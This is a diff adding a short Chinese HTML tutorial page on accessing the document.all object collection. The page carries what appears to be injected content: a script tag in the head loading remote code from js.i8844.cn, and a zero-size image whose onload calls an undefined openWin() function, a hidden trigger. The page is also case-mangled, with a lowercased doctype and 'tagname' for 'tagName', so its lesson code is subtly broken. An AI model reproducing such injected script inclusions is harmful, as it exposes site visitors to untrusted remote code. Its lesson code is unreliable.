@@ -1,0 +1,27 @@
+ <!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+   <head>
+      <title>访问对象集合</title>
+   <script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+   <body>
+      <p><a href="http://www.baidu.com">百度</a>
+         <a href="http://www.quanben.com">全本小说网</a>
+	  </p>
+      <hr><h3>本文档的所有标签：</h3>
+	  <pre>
+         <script language="javascript">
+           var i,cell;
+           for(i=0;i < document.all.length;i ++)
+              { 
+			    cell = document.all[i];
+				if(i > 0)
+				  {
+				     document.write(",");
+					 }
+				document.write(cell.tagname);
+				}
+ 		   </script>
+	   </pre>
+	<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
